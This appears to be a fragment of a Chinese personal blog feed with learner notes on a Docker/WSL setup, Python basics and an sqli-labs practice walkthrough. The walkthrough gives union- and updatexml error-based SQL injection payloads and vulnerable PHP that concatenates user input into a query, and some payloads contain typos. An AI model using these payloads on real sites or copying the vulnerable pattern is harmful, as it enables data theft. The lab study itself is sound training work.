class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Bio-Data Details<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Bio-Data Details<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Username: &#123;&#123; username &#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Email: &#123;&#123; email &#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hobbies: &#123;&#123; hobbies &#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="Docker-wsl安装"><a href="#Docker-wsl安装" class="headerlink" title="Docker+wsl安装"></a>Docker+wsl安装</h1><h2 id="安装wsl"><a href="#安装wsl" class="headerlink" title="安装wsl"></a>安装wsl</h2><p>cmd输入命令：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl <span class="literal">--install</span></span><br></pre></td></tr></table></figure><p>响应</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">正在安装:虚拟机平台已安装虚拟机平台。</span><br><span class="line">正在安装:适用于Linux的 Windows子系统已安装适用于Linux 的 Windows子系统。正在安装:适用于 Linux的 Windows子系统已安装适用于Linux的 Windows子系统。正在安装:Ubuntu</span><br><span class="line">己安装 Ubuntu。</span><br><span class="line">请求的操作成功。直到重新启动系统前更改将不会生效。</span><br></pre></td></tr></table></figure><h2 id="启用Hyber-V"><a href="#启用Hyber-V" class="headerlink" title="启用Hyber-V"></a>启用Hyber-V</h2><p>桌面建立txt文件，输入代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pushd &quot;%~dp0&quot;</span><br><span class="line">dir /b %SystemRoot%\servicing\Packages\*Hyper-V*.mum &gt;hyper-v.txt</span><br><span class="line">for /f %%i in (&#x27;findstr /i . hyper-v.txt 2^&gt;nul&#x27;) do dism /online /norestart /add-package:&quot;%SystemRoot%\servicing\Packages\%%i&quot;</span><br><span class="line">del hyper-v.txt</span><br><span class="line">Dism /online /enable-feature /featurename:Microsoft-Hyper-V-All /LimitAccess /ALL</span><br></pre></td></tr></table></figure><p>将文件重命名为<code>Hyber-V.bat</code>，右键管理员身份运行部署映像服务和管理工具</p><p>控制面板-程序-程序与功能-启动或关闭windows功能，勾上Hyber-V</p><h2 id="安装配置Docker-Desktop"><a href="#安装配置Docker-Desktop" class="headerlink" title="安装配置Docker Desktop"></a>安装配置Docker Desktop</h2><h3 id="安装Docker-Desktop-Installer-exe"><a href="#安装Docker-Desktop-Installer-exe" class="headerlink" title="安装Docker Desktop Installer.exe"></a>安装Docker Desktop Installer.exe</h3><p>提示：当前无法访问smartscreen</p><p>解决：开始-设置-隐私和安全性-windows安全中心-打开windows安全中心-选择【应用和浏览器控制】，关闭</p><h3 id="拉取国内镜像源"><a href="#拉取国内镜像源" class="headerlink" title="拉取国内镜像源"></a>拉取国内镜像源</h3><p>settings -&gt; docker engine，加入代码：、</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&quot;registry-mirrors&quot;: [</span><br><span class="line">    &quot;https://docker.mirrors.ustc.edu.cn&quot;,</span><br><span class="line">    &quot;https://registry.docker-cn.com&quot;,</span><br><span class="line">    &quot;http://hub-mirror.c.163.com&quot;,</span><br><span class="line">    &quot;https://mirror.ccs.tencentyun.com&quot;</span><br><span class="line">  ]</span><br></pre></td></tr></table></figure><p>报错：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Unexpected non-whitespace character after JSON at position 124</span><br></pre></td></tr></table></figure><p>尝试1：管理员身份打开powershell更新</p><p>尝试2：修改DNS地址</p><p>尝试3：更新wsl（？）</p><p>报错：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error code: Wsl/UpdatePackage/WININET_E_CANNOT_CONNECT</span><br></pre></td></tr></table></figure><p>解决问题：更改属性顺序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;registry-mirrors&quot; : [</span><br><span class="line">    &quot;https://registry.docker-cn.com&quot;,</span><br><span class="line">    &quot;http://hub-mirror.c.163.com&quot;,</span><br><span class="line">    &quot;https://docker.mirrors.ustc.edu.cn&quot;,</span><br><span class="line">    &quot;https://cr.console.aliyun.com&quot;,</span><br><span class="line">    &quot;https://mirror.ccs.tencentyun.com&quot;</span><br><span class="line">  ],</span><br><span class="line">  &quot;builder&quot;: &#123;</span><br><span class="line">    &quot;gc&quot;: &#123;</span><br><span class="line">      &quot;defaultKeepStorage&quot;: &quot;20GB&quot;,</span><br><span class="line">      &quot;enabled&quot;: true</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;experimental&quot;: false,</span><br><span class="line">  &quot;features&quot;: &#123;</span><br><span class="line">    &quot;buildkit&quot;: true</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不懂什么原理但是成功通过</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sqli-lab通关笔记</title>
      <link href="/2024/03/24/2024-03-24-sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/"/>
      <url>/2024/03/24/2024-03-24-sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="sqli-lab"><a href="#sqli-lab" class="headerlink" title="sqli-lab"></a>sqli-lab</h1><h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><ol><li><p>判断是否存在注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=2 -- a</span></span><br></pre></td></tr></table></figure></li><li><p>判断字段长度</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-1</span><span class="operator">/</span>id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 3 -- a</span></span><br></pre></td></tr></table></figure></li><li><p>判断显错位</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,3 -- a</span></span><br></pre></td></tr></table></figure></li><li><p>判断库名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1 , database()),3 -- a</span></span><br></pre></td></tr></table></figure></li><li><p>判断表名：<code>table_name</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,table_name,3 from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; -- a</span></span><br></pre></td></tr></table></figure></li><li><p>判断列名：<code>column_name</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,column_name,3 from</span></span><br><span class="line"><span class="string">information_schema.columns where table_schema=&#x27;</span>security<span class="string">&#x27; and table_name=&#x27;</span>emails<span class="string">&#x27; -- a</span></span><br></pre></td></tr></table></figure></li><li><p>判断数据：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,id，3 from emails -- a</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>( <span class="string">&#x27; 127.0.0.1&#x27;</span> , <span class="string">&#x27; root &#x27;</span> , <span class="string">&#x27; root &#x27;</span> , <span class="string">&#x27;test &#x27;</span>);</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">mysqli_query</span>( <span class="variable">$conn</span>, <span class="string">&quot;select username from users where id=&quot;</span>.<span class="variable">$_GET</span>[ <span class="string">&#x27;id&#x27;</span> ]);</span><br><span class="line"><span class="comment">//代码用于根据用户输入的id查询用户的信息。用户的输入id字段没有任何过滤地被直接拼接在了sql查询语句中。由于id没有被引号包裹，而且类型为数字，我们称这种注入为数字型注入。</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>( <span class="string">&#x27; 127.0.0.1&#x27;</span> , <span class="string">&#x27; root &#x27;</span> , <span class="string">&#x27; root &#x27;</span> , <span class="string">&#x27;test &#x27;</span>);</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">mysqli_query</span>( <span class="variable">$conn</span>, <span class="string">&quot;select username from users where id=&quot;</span>.<span class="variable">$_GET</span>[ <span class="string">&#x27;id&#x27;</span> ]);<span class="variable">$row</span>= <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$res</span> );</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>( <span class="variable">$row</span>[ <span class="string">&#x27; username &#x27;</span> ] );</span><br><span class="line"><span class="variable">$row</span>= <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$res</span> );</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>( <span class="variable">$row</span>[ <span class="string">&#x27; username &#x27;</span> ] );</span><br></pre></td></tr></table></figure><p>测试注入存在：使用减法语句测试，如传参<code>id=1</code>、<code>id=2-1</code>、<code>id=3-1</code>的结果差异</p><h3 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h3><p>将两个select语句结果合并到一个结果集中，要求两个select语句拥有相同列数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Less-1/?id=-1 union select password from users</span><br></pre></td></tr></table></figure><p>由于没有id为0的列，所以第一个select的结果为空，第二个select语句查询了users表中的password列，所以最后的查询结果就是users表中password列的第一行。如果需要查询其他行，还需要使用limit关键字进行选择。</p><h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><ol><li><p>判断是否存在注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=2 -- a</span></span><br></pre></td></tr></table></figure></li><li><p>判断库名：<code>database()</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml( 1 ,concat(0x7e,(SELECT database()),0x7e),1)-- a</span></span><br></pre></td></tr></table></figure></li><li><p>判断表名：<code>table_name</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(Ox7e,(select table_name from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;limit 0,1),0x7e),1)-- a</span></span><br></pre></td></tr></table></figure></li><li><p>判断列名：<code>column_name</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(Ox7e,(select column_name from information_schema.columns where table_schema=&#x27;</span>security<span class="string">&#x27; and table_name=&#x27;</span>emails<span class="string">&#x27;limit 0,1),0x7e),1)-- a</span></span><br></pre></td></tr></table></figure></li><li><p>判断数据：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(Ox7e,(select id from emails limit 0,1),0x7e),1)-- a</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><p>闭合：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-3</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;) and i=1 -- a</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Python基础知识（自存）</title>
      <link href="/2024/03/21/2024-03-21-Python%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%EF%BC%88%E8%87%AA%E5%AD%98%EF%BC%89/"/>
      <url>/2024/03/21/2024-03-21-Python%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%EF%BC%88%E8%87%AA%E5%AD%98%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="Python基础知识"><a href="#Python基础知识" class="headerlink" title="Python基础知识"></a>Python基础知识</h1><h2 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h2><h4 id="交互式编程"><a href="#交互式编程" class="headerlink" title="交互式编程"></a>交互式编程</h4><p><strong>Linux</strong> ：在命令行中输入 Python 命令即可启动交互式编程</p><p><strong>Windows</strong> 在安装 Python 时已安装了交互式编程客户端</p><h4 id="脚本式编程"><a href="#脚本式编程" class="headerlink" title="脚本式编程"></a>脚本式编程</h4><p>所有 Python 文件将以 <strong>.py</strong> 为扩展名。</p><h3 id="Python2-x-中使用-Python3-x-的-print-函数"><a href="#Python2-x-中使用-Python3-x-的-print-函数" class="headerlink" title="Python2.x 中使用 Python3.x 的 print 函数"></a>Python2.x 中使用 Python3.x 的 print 函数</h3><p>如果 Python2.x 版本想使用 Python3.x 的 print 函数，可以导入 <strong><strong>future</strong></strong> 包，该包禁用 Python2.x 的 print 语句，采用 Python3.x 的 print 函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">list</span> =[<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> <span class="built_in">list</span>    <span class="comment"># python2.x 的 print 语句</span></span><br><span class="line">[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function  <span class="comment"># 导入 __future__ 包</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> <span class="built_in">list</span>     <span class="comment"># Python2.x 的 print 语句被禁用，使用报错</span></span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">list</span></span><br><span class="line">             ^</span><br><span class="line">SyntaxError: invalid syntax</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> (<span class="built_in">list</span>)   <span class="comment"># 使用 Python3.x 的 print 函数</span></span><br><span class="line">[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>]</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h4 id=""><a href="#" class="headerlink" title=""></a></h4><h3 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h3><p>标识符由字母（区分大小写）、数字、下划线组成。所有标识符可以包括英文、数字以及下划线(_)，<u>但不能以数字开头。</u></p><p>以下划线开头的标识符是有特殊意义的。以单下划线开头 <strong>_foo</strong> 的代表不能直接访问的类属性，需通过类提供的接口进行访问，不能用 <strong>from xxx import *</strong> 而导入。</p><p>以双下划线开头的 <strong>__foo</strong> 代表类的私有成员，以双下划线开头和结尾的 <strong><strong>foo</strong></strong> 代表特殊方法专用的标识，如 <strong><strong>init</strong>()</strong> 代表类的构造函数。</p><p>可以同一行显示多条语句，方法是用分号 <strong>;</strong> 分开。</p><h3 id="保留字符"><a href="#保留字符" class="headerlink" title="保留字符"></a>保留字符</h3><p>不能用作常数或变数，或任何其他标识符名称。只包含小写字母。</p><table><thead><tr><th align="left">and</th><th>exec</th><th>not</th></tr></thead><tbody><tr><td align="left">assert</td><td>finally</td><td>or</td></tr><tr><td align="left">break</td><td>for</td><td>pass</td></tr><tr><td align="left">class</td><td>from</td><td>print</td></tr><tr><td align="left">continue</td><td>global</td><td>raise</td></tr><tr><td align="left">def</td><td>if</td><td>return</td></tr><tr><td align="left">del</td><td>import</td><td>try</td></tr><tr><td align="left">elif</td><td>in</td><td>while</td></tr><tr><td align="left">else</td><td>is</td><td>with</td></tr><tr><td align="left">except</td><td>lambda</td><td>yield</td></tr></tbody></table><h3 id="行和缩进"><a href="#行和缩进" class="headerlink" title="行和缩进"></a>行和缩进</h3><p>代码块不使用大括号 <strong>{}</strong> 来控制类，函数以及其他逻辑判断,而是用缩进来写模块。</p><p>缩进的空白数量是可变的，但是所有代码块语句<u>必须包含相同的缩进空白数量</u>，这个必须严格执行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;True&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;False&quot;</span>)</span><br></pre></td></tr></table></figure><p>以上实例缩进为四个空格</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="comment"># 文件名：test.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;Answer&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;True&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;Answer&quot;</span>)</span><br><span class="line">  <span class="comment"># 没有严格缩进，在执行时会报错</span></span><br><span class="line"> <span class="built_in">print</span> (<span class="string">&quot;False&quot;</span>)</span><br></pre></td></tr></table></figure><p>执行以上代码，会出现如下错误提醒：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  File <span class="string">&quot;test.py&quot;</span>, line <span class="number">11</span></span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;False&quot;</span>)</span><br><span class="line">                  ^</span><br><span class="line">IndentationError: unindent does <span class="keyword">not</span> <span class="keyword">match</span> <span class="built_in">any</span> outer indentation level</span><br></pre></td></tr></table></figure><p><strong>IndentationError: unindent does not match any outer indentation level</strong>错误表明，你使用的缩进方式不一致，有的是 tab 键缩进，有的是空格缩进，改为一致即可。</p><p> <strong>IndentationError: unexpected indent</strong> 错误表明”**文件里格式错误，可能是 tab 和空格没对齐”，因此，在 Python 的代码块中必须使用相同数目的行首缩进空格数。</p><p>可以在每个缩进层次使用 <strong>单个制表符</strong> 或 <strong>两个空格</strong> 或 <strong>四个空格</strong> , 切记<strong>不能混用</strong>。</p><h3 id="多行语句"><a href="#多行语句" class="headerlink" title="多行语句"></a>多行语句</h3><p>一般以新行作为语句的结束符。可以使用斜杠（ \）将一行的语句分为多行显示，如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">total = item_one + \</span><br><span class="line">        item_two + \</span><br><span class="line">        item_three</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>语句中包含 [], {} 或 () 括号就不需要使用多行连接符。如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">days = [<span class="string">&#x27;Monday&#x27;</span>, <span class="string">&#x27;Tuesday&#x27;</span>, <span class="string">&#x27;Wednesday&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Thursday&#x27;</span>, <span class="string">&#x27;Friday&#x27;</span>]</span><br></pre></td></tr></table></figure><p>同一行显示多条语句：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys; x = <span class="string">&#x27;runoob&#x27;</span>; sys.stdout.write(x + <span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python test.py</span><br><span class="line">runoob</span><br></pre></td></tr></table></figure><h3 id="引号"><a href="#引号" class="headerlink" title="引号"></a>引号</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">word = <span class="string">&#x27;word&#x27;</span></span><br><span class="line">sentence = <span class="string">&quot;这是一个句子。&quot;</span></span><br><span class="line">paragraph = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">可以使用引号、双引号、三引号来表示字符串，引号的开始与结束必须是相同类型的。</span></span><br><span class="line"><span class="string">其中三引号可以由多行组成，编写多行文本的快捷语法，常用于文档字符串，在文件的特定地点，被当做注释。&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>单行注释采用 <strong>#</strong> 开头，多行注释使用三个单引号 <strong>‘’’</strong> 或三个双引号 <strong>“””</strong></p><h3 id="等待用户输入"><a href="#等待用户输入" class="headerlink" title="等待用户输入"></a>等待用户输入</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line">raw_input(<span class="string">&quot;按下 enter 键退出，其他任意键显示...\n&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="print-输出"><a href="#print-输出" class="headerlink" title="print 输出"></a>print 输出</h3><p>默认输出是换行的，如果要实现不换行需要在变量末尾加上逗号 **,**。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line">x=<span class="string">&quot;a&quot;</span></span><br><span class="line">y=<span class="string">&quot;b&quot;</span></span><br><span class="line"><span class="comment"># 换行输出</span></span><br><span class="line"><span class="built_in">print</span> x</span><br><span class="line"><span class="built_in">print</span> y</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;---------&#x27;</span></span><br><span class="line"><span class="comment"># 不换行输出</span></span><br><span class="line"><span class="built_in">print</span> x,</span><br><span class="line"><span class="built_in">print</span> y,</span><br><span class="line"></span><br><span class="line"><span class="comment"># 不换行输出</span></span><br><span class="line"><span class="built_in">print</span> x,y</span><br></pre></td></tr></table></figure><h3 id="代码组"><a href="#代码组" class="headerlink" title="代码组"></a>代码组</h3><p>缩进相同的一组语句构成一个代码块，我们称之代码组。</p><p>像if、while、def和class这样的复合语句，首行以关键字开始，以冒号( : )结束，该行之后的一行或多行代码构成代码组。</p><h2 id="变量类型"><a href="#变量类型" class="headerlink" title="变量类型"></a>变量类型</h2><p>不需要类型声明，等号 <strong>&#x3D;</strong> 用来给变量赋值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line">counter = <span class="number">100</span> <span class="comment"># 赋值整型变量</span></span><br><span class="line">miles = <span class="number">1000.0</span> <span class="comment"># 浮点型</span></span><br><span class="line">name = <span class="string">&quot;John&quot;</span> <span class="comment"># 字符串</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> counter</span><br><span class="line"><span class="built_in">print</span> miles</span><br><span class="line"><span class="built_in">print</span> name</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">100</span></span><br><span class="line"><span class="number">1000.0</span></span><br><span class="line">John</span><br></pre></td></tr></table></figure><h3 id="多个变量赋值"><a href="#多个变量赋值" class="headerlink" title="多个变量赋值"></a>多个变量赋值</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a = b = c = <span class="number">1</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 